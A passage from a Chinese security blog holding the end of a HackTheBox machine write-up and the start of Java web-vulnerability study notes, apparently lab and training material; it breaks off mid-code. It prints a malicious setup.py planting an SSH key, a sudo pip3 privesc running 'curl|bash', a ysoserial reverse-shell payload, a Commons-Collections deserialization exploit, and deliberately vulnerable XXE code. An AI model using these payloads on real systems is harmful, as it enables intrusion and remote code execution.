1.0in;&#125;div.WordSection1 &#123;page:WordSection1;&#125;--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D\"#954F72\"&gt;&lt;div cla=ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=l&gt;Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--)F1 OK FETCH completed.F1 fetch 2 RFC822* 2 FETCH (RFC822 &#123;585&#125;To: low@debianFrom: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Module testingMessage-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;Date: Wed, 27 May 2020 13:28:58 -0400User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Thunderbird/68.8.0MIME-Version: 1.0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 7bitContent-Language: en-USHello lowYour current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.)F1 OK FETCH completed. 第一份邮件泄露了一份用户密码developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C.第二个邮件泄露了一个用户。看起来可以继续进行账户密码的尝试了。 果不其然还是没有得到ssh的账户。但是developer可以登陆ftp。看了下发现里面是个dev文件夹。内容跟我们80端口的网页一致。先把dev文件夹拖下来。 1wget ftp://10.10.10.197:21/* --ftp-user=developer --ftp-password=m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C -r 仔细一审发现都是静态文件。这点有点懵。不过文件夹名字倒是提醒了我一个疏忽的地方。那就是我忘记收集子域名了。于是wfuzz走起收集子域名。发现确实存在dev.sneakycorp.htb 既然我们的ftp目录是对应的web目录。那就直接mput上传webshell即可。命令执行getshell. 小结下。这一部分总体上只有enum的内容。不过整体上收获挺大的。因为以前没怎么接触过smtp.现在借此机会接触smtp,imap熟悉了相对应的命令倒是挺不错的。 privesc to user 接下来是提权部分。这里我重点关注pypi跟low.因为这两个用户在前阶段出现的频率比较高。 首先很容易发现/var/www有四个文件夹dev.sneakymailer.htb,pypi.sneakymailer.htb,sneakymailer.htb跟html.其中dev跟html内容一致我们不用管。这里pypi.sneakymailer.htb倒是个挺难爆出来的子域名。那么先加到hosts里去。发现对应的原来就是之前的8080端口的服务。网页内容是个pypiserver 1.3.2.然后有两个内容都要密码。 看起来web页面没啥用。直接去pypi文件夹下找内容。发现一个.htpasswd 1pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F; 查看hash-examples发现是apache apr hash.hashcat破解之。 1hashcat -m 1600 -a 0 --force -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt 得到$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui现在我们倒是能用这组账户登录8080的pypiserver。但是似乎还是没啥用。看来我们得去了解下pypiserver 作用https://pypi.org/project/pypiserver/#table-of-contents这里面 Uploading Packages Remotely 这个功能比较吸引眼球。假如我们能上传恶意package。应该就能执行命令了。跑个linpeas.sh.看看 12pypi 691 0.1 0.6 36800 25764 ? Ss 04:06 0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packageslow 1098 0.1 0.5 29952 20976 ? Ss 04:07 0:00 /home/low/venv/bin/python /opt/scripts/low/install-modules.py 看起来low用户的确在执行python modules的下载。那么接下来我们看看如何构建一个恶意的setup.py。网上找个demo.准备一个写公钥的payload。 123456789101112131415161718192021222324import setuptoolstry: with open(\"/home/low/.ssh/authorized_keys\", \"a\") as f: f.write(\"\"\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD1J7hVPxdMEhfE1XL2OOPjgQvKZGm68ldluK8TTW70AVRKxwvfUzOCJA4vPFgrzeJ5E27UTYatqxtxIDagHHjMtmkt+FFk62Xe8qO4pDlzQEjrSiXA/Ex82KHqlnDReaRHEEcc4CmtvzBVavB4o34CeTUYEG2N7OC1RbVUZkX9ULjodiaasubHG4lo5M2wYZ+1RjPxl/wupsEmPzB/SoSUgCAMra/tsd1jxhsJ0+m45puGKgv5Zb4IeWMATdd+Ea6v7J70YUns1E7Ciutn83jRw4efId4ZNJDGCA0GYKqaYLKsj/gA+evl/6asj8TQBgD516xFp2bpdGWuzy0sef2c22E6xS9Vs/uUpwC5T8hMlvjxtFIJE57dQz6JrJdwqQk1Jf3WQUoU6NfcRTampYVdrTHAatLccghgAS8ldA0vxO7hTzSDocO6iTfDqPrfRQfk7F0/geEP7KgoWKAJvBz1RQpmTvvhWa6lbESafIjzPPfN0e2I17CPSir/ek5fZh0= root@byc404\"\"\") f.close()except Exception as e: passsetuptools.setup( name=\"byc_404\", version=\"0.0.1\", author=\"byc\", author_email=\"byc@bycsec.top\", description=\"A small example package\", long_description=\"\", long_description_content_type=\"\", url=\"https://github.com/pypa/sampleproject\", packages=setuptools.find_packages(), classifiers=[ \"Programming Language :: Python :: 3\", \"License :: OSI Approved :: MIT License\", \"Operating System :: OS Independent\", ],) 然后是~/.pypirc文件。使用它有以下两个优势 It removes the need to enter a username/password when pushing to PyPI. 2. It simplifies command line usage when pushing packages to a non-default package repository (i.e. anywhere other than pypi.org). 这样我们就不用重复输入用户密码。同时保证内容推向sneakycorp.htb所在的pypi仓库。按照官网设定修改下 1234567[distutils]index-servers &#x3D; local[local]repository: http:&#x2F;&#x2F;pypi.sneakycorp.htb:8080&#x2F;username: pypipassword: soufianeelhaoui 先chmod 600 .pypirc 然后再执行以下命令来upload package。 1python setup.py sdist register -r local upload -r local 虽然会提示这种操作方法已经deprecated了。但是不影响完成命令。当然这样使用是因为靶机没安装twine.不过基于pypiserver是暴露在公网的。我们直接本地使用twine也可以。 123python3 setup.py sdist bdist_wheelpython3 -m twine upload –repository local dist/* 写入公钥即可ssh登录收下user.txt. 这一部分pypiserver的使用挺有意思的。不过我这里试了不写公钥直接命令执行倒是没有用,感觉有点问题（也许是因为靶机动不动重启吧，毕竟刚出的靶机总是容易卡） privesc to root这一部分倒是过于简单了。由于前面搜索资料时搜到了pip的privesc.所以执行sudo -l发现可以pip3后就简单了https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/ 123TF=$(mktemp -d)echo \"import os;os.system('curl 10.10.14.87|bash')\" &gt; $TF/setup.pysudo pip3 install $TF rooted. summary整体上来说root之前的部分都算是新知识。邮件的部分挺有意思的。感觉非常接近真实实战。假如真的有用户安全意识不强点击了我们的链接就可以打开另一片天地了。后面python的部分可能有点技穷了。不过确实算是python用于提权的常见手段。恶意包或者恶意py源码都可以导致提权发生。","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"学习笔记-Java相关","slug":"学习笔记-Java相关","date":"2020-07-09T03:04:44.000Z","updated":"2021-02-18T05:08:44.717Z","comments":true,"path":"2020/07/09/学习笔记-Java相关/","link":"","permalink":"https://www.bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/","excerpt":"从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。 大体上打算从常见漏洞和框架使用两个方面学习。因为有语言基础就不谈比较基础的部分了。","text":"从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。 大体上打算从常见漏洞和框架使用两个方面学习。因为有语言基础就不谈比较基础的部分了。 vulnsjava比较常见的有特色的漏洞包括但不限于 deserialization xxe SpEL ssti url bypass…… 这里用JoyChou大佬的项目学习 https://github.com/JoyChou93/java-sec-code非常全面。 每种漏洞都有对应的源码。原先很多反序列的洞复现过但是没有看过源码。这里正好研究下。 deserialization恶意及防范源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package org.joychou.controller;import org.joychou.config.Constants;import org.joychou.security.AntObjectInputStream;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletRequest;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.InvalidClassException;import java.io.ObjectInputStream;import java.util.Base64;import static org.springframework.web.util.WebUtils.getCookie;/** * Deserialize RCE using Commons-Collections gadget. * * @author JoyChou @2018-06-14 */@RestController@RequestMapping(\"/deserialize\")public class Deserialize &#123; protected final Logger logger = LoggerFactory.getLogger(this.getClass()); /** * java -jar ysoserial.jar CommonsCollections5 \"open -a Calculator\" | base64 * Add the result to rememberMe cookie. * &lt;p&gt; * http://localhost:8080/deserialize/rememberMe/vuln */ @RequestMapping(\"/rememberMe/vuln\") public String rememberMeVul(HttpServletRequest request) throws IOException, ClassNotFoundException &#123; Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) &#123; return \"No rememberMe cookie. Right?\"; &#125; String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); ObjectInputStream in = new ObjectInputStream(bytes); in.readObject(); in.close(); return \"Are u ok?\"; &#125; /** * Check deserialize class using black list. * &lt;p&gt; * http://localhost:8080/deserialize/rememberMe/security */ @RequestMapping(\"/rememberMe/security\") public String rememberMeBlackClassCheck(HttpServletRequest request) throws IOException, ClassNotFoundException &#123; Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) &#123; return \"No rememberMe cookie. Right?\"; &#125; String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); try &#123; AntObjectInputStream in = new AntObjectInputStream(bytes); // throw InvalidClassException in.readObject(); in.close(); &#125; catch (InvalidClassException e) &#123; logger.info(e.toString()); return e.toString(); &#125; return \"I'm very OK.\"; &#125;&#125; 这里应该是模仿shiro的rememberMecookie反序列化.下面先来回顾下java的序列化知识 https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/ about Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 usage 1.弥补操作系统的差异2.向远程对象发送信息时，需要通过对象序列化来传输参数和返回值3.使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的4.方便保存对象信息以便于下次JVM启动时可以直接使用。 dependencies 1.实现 java.io.Serializable 对象2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 下面是一个练手的例子。User类 123456789import java.io.*;public class User implements Serializable &#123; public String name; public int num; public void info()&#123; System.out.println(\"name : \"+name+\"\\nnum : \"+num); &#125;&#125; test类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.io.*;public class test &#123; public static void serialize_test()&#123; User user=new User(); user.name=\"byc_404\"; user.num=404; user.info(); try &#123; FileOutputStream f= new FileOutputStream(\"user.ser\"); ObjectOutputStream o =new ObjectOutputStream(f); o.writeObject(user); o.close(); f.close(); System.out.println(\"[*]serialize done.\"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user=null; try &#123; FileInputStream f= new FileInputStream(\"user.ser\"); ObjectInputStream o =new ObjectInputStream(f); user=(User)o.readObject(); o.close(); f.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; System.out.println(\"[*]unserialize done.\"); user.info(); &#125; public static void main(String[] args) &#123; unserialize_test(); &#125;&#125; 首先注意上面的语句直接调用读写文件时都需要实现trycatch。而readobject时特殊的添加了一个ClassNotFound 的异常。在idea中写好原代码后ctrl+alt+t添加会自动考虑到这些问题，生成的user.ser的数据 开头AC ED 表示支持序列化协议。00 05 则是序列化版本。这是序列化数据比较显著的特征。 由于编程中的选择原因，有时需要我们实现非默认的序列化过程。此时可以在实现了Serializable接口的前提下添加两个方法 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法同理 那么回到远程。这里直接打一发弹shell的payload。去jackson直接转换下编码 1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64 这环境貌似是只有cc5的gadget能用.后来在原作者那看到应该是引入了apache-commons-collections 3.1.jar CommonCollections 审计 下面正好来审计下Commons-Collections这个包。https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 在这下好jar包后把它加进library.就可以看源码了。漏洞代码出现在这一部分。 TransformedMap类是实现了serializable,对Java标准数据结构Map接口的一个扩展TransformedMap.decorate()方法，可以获得一个TransformedMap的实例化的对象。 TransformedMap.decorate()方法能将普通的MapA转换为TransformedMapB，同时如果TransformedMap.decorate()方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer Map.put与Map.Entry其实就是Map的两个比较常见的接口。前者可以往map中设置一对键值。后者则是定义了getKey(),getValue()，setKey(),setValue()等方法可以用来获取修改键值。 牛逼的是这个Transformer可以利用数组构造成ChainedTransformer，ChainedTransformer最后利用Java的反射机制命令执行。 关于反射命令执行。这个算是java非常常见的命令技巧了。在SpEL跟Spring 的ssti中经常见到。主要目的就是绕过沙盒。当然如php的序列化中也曾经遇到过.这算是Java动态特性的体现。 一个弹计算器的反射payload 1234567891011121314151617181920import java.lang.reflect.Method;public class reflect &#123; public static void main(String[] args) throws Exception &#123; Object input = Runtime.class; Class cls = input.getClass(); Method method = cls.getMethod(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;); input = method.invoke(input, new Object[] &#123; \"getRuntime\", new Class[0] &#125;); // 此时cls为Method，对应getRuntime方法，获取invoke方法并执行 cls = input.getClass(); method = cls.getMethod(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;); input = method.invoke(input, new Object[] &#123; null, new Object[0] &#125;); // 此时cls为Runtime，对应Runtime.getRuntime()的结果，可调用exec方法 cls = input.getClass(); method = cls.getMethod(\"exec\", new Class[] &#123; String.class &#125;); input = method.invoke(input, new Object[] &#123; \"calc\" &#125;); &#125;&#125; 下面来跟着JoyChou师傅的博文看看Map.put是怎么通过构造达成命令执行的。 12345678910111213141516171819202122232425262728import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class poc1 &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(\"name\", \"byc_404\"); Map outmap = TransformedMap.decorate(innermap, transformerChain, null); outmap.put(\"quote\",\"23333\"); &#125;&#125; 在put()方法那下一个断点。第一步是调用TransformedMap.put()方法然后进行一个keyTransformer是否为空的判断。我们因为设置了ChainedTransformer作为keyTransformer,因此接下来是调用ChainedTransformer.transform()可以看到下面的this就是ChainedTransformer对象。然后这个for循环会总共调用四次transform(),调用1次ConstantTransformer.transform()方法，然后调用3次InvokerTransformer.transform() 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); &#125; &#125; &#125;&#125; 到这一步已经能看出我们构造函数的参数已经控制InvokerTransformer反射的参数了。达成命令执行。gadget 12345678910111213TransformedMap.put() &#x3D;&gt;TransformedMap.transformKey() &#x3D;&gt;ChainedTransformer.transform() &#x3D;&gt;ConstantTransformer.transform() &#x3D;&gt;InvokerTransformer.transform() &#x3D;&gt;Method.invoke() Class.getMethod() &#x3D;&gt;InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() &#x3D;&gt;InvokerTransformer.transform() Method.invoke() Runtime.exec() Map.Entry的poc我就不跟了。基本上是一样的机理。 接下来也就是CommonCollections的gadget了。上面我们知道,我们可以利用Map类的对象进行反射的payload构造。那么我们恶意类的成员肯定是Map类的。并且由于反序列化的要求,这个类重写了readObject(),并且在readObject()中调用了put()或者setValue() 在不同jdk版本中我们能找到的符合要求的类不同。目前比较新的应该是用BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformer的链子先来看下BadAttributeValueExpException 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return \"BadAttributeValueException: \" + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125; &#125; &#125; 从BadAttributeValueExpException类的readObejct()方法知道,val.toString()是整个readObject()的重点。现在需要一个类，能在调用toString()方法时触发transform()方法来执行我们构造的反射链 找到LazyMap的get()方法。与php的魔术方法一样,可以在调用不存在的key时来执行一个方法生成key. 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125;&#125; 最后是TiedMapEntry类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package org.apache.commons.collections.keyvalue;import java.io.Serializable;import java.util.Map;import java.util.Map.Entry;import org.apache.commons.collections.KeyValue;public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException(\"Cannot set value to this map entry\"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; Entry other = (Entry)obj; Object value = this.getValue(); return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) &amp;&amp; (value == null ? other.getValue() == null : value.equals(other.getValue())); &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + \"=\" + this.getValue(); &#125;&#125; 它在调用toString()时,实际上调用了getValue()即map.get(key)。这样它就符合上面Lazymap的要求了。那么gadget就是 1234BadAttributeValueExpException.readObject()//其val为TiedMapEntry =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()//其map对象是LazyMap =&gt;LazyMap.get()//其factory对象是ChainedTransformer =&gt;ChainedTransformer.transform() 最终的exp.也是cc5的链子 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class exp &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"calc\"&#125;), new ConstantTransformer(\"1\") &#125;; Transformer transformChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo233\"); BadAttributeValueExpException exception = new BadAttributeValueExpException(null); Field valField = exception.getClass().getDeclaredField(\"val\"); valField.setAccessible(true); valField.set(exception, entry); File f = new File(\"poc\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(exception); out.flush(); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\"poc\")); in.readObject(); // 触发漏洞 in.close(); &#125;&#125; done. 防御机制 从demo的安全代码部分就能看出。使用了AntObjectInputStream与InvalidClassException来进行黑/白名单的防范。具体可以看其自定义的代码 https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java直接Hook java/io/ObjectInputStream类的resolveClass方法 //今天先写这么多吧,好久没写java写起来还挺怀念的。 XXEXXE在java-sec-code项目中被分为了两个部分。普通XXE与POI ooxml XXE.我们先从基础的看起。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453package org.joychou.controller;import org.dom4j.DocumentHelper;import org.dom4j.io.SAXReader;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.*;import javax.servlet.http.HttpServletRequest;import org.w3c.dom.Document;import org.w3c.dom.Node;import org.w3c.dom.NodeList;import org.xml.sax.helpers.XMLReaderFactory;import org.xml.sax.XMLReader;import java.io.*;import org.xml.sax.InputSource;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.SAXParserFactory;import javax.xml.parsers.SAXParser;import org.xml.sax.helpers.DefaultHandler;import org.apache.commons.digester3.Digester;import org.jdom2.input.SAXBuilder;import org.joychou.util.WebUtils;/** * Java xxe vuln and security code. * * @author JoyChou @2017-12-22 */@RestController@RequestMapping(\"/xxe\")public class XXE &#123; private static Logger logger = LoggerFactory.getLogger(XXE.class); private static String EXCEPT = \"xxe except\"; @PostMapping(\"/xmlReader/vuln\") public String xmlReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml return \"xmlReader xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/xmlReader/sec\", method = RequestMethod.POST) public String xmlReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"xmlReader xxe security code\"; &#125; @RequestMapping(value = \"/SAXBuilder/vuln\", method = RequestMethod.POST) public String SAXBuilderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe return \"SAXBuilder xxe vuln code\"; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = \"/SAXBuilder/sec\", method = RequestMethod.POST) public String SAXBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXBuilder xxe security code\"; &#125; @RequestMapping(value = \"/SAXReader/vuln\", method = RequestMethod.POST) public String SAXReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXReader xxe vuln code\"; &#125; @RequestMapping(value = \"/SAXReader/sec\", method = RequestMethod.POST) public String SAXReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXReader reader = new SAXReader(); reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); reader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); reader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return \"SAXReader xxe security code\"; &#125; @RequestMapping(value = \"/SAXParser/vuln\", method = RequestMethod.POST) public String SAXParserVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new 